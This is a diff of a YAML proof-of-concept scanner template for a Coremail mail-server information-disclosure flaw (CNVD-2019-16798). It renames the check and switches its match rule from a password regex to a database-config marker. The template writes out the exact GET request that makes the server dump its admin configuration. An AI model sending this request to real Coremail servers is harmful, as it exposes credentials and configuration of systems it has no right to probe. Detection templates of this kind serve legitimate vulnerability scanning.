@@ -1,11 +1,11 @@
-name: poc-yaml-coremail-information-disclosure
+name: poc-yaml-coremail-cnvd-2019-16798
 rules:
   - method: GET
     path: >-
       /mailsms/s?func=ADMIN:appState&dumpConfig=/
     follow_redirects: false
     expression: >
-      status==200 && r'"Password">[a-zA-Z0-9~!@&%#_]{6,32}</string>'.bmatches(body)
+      status==200 && body.bcontains(b'<object name="cm_md_db">')
 detail:
   author: cc_ci(https://github.com/cc8ci)
   links:
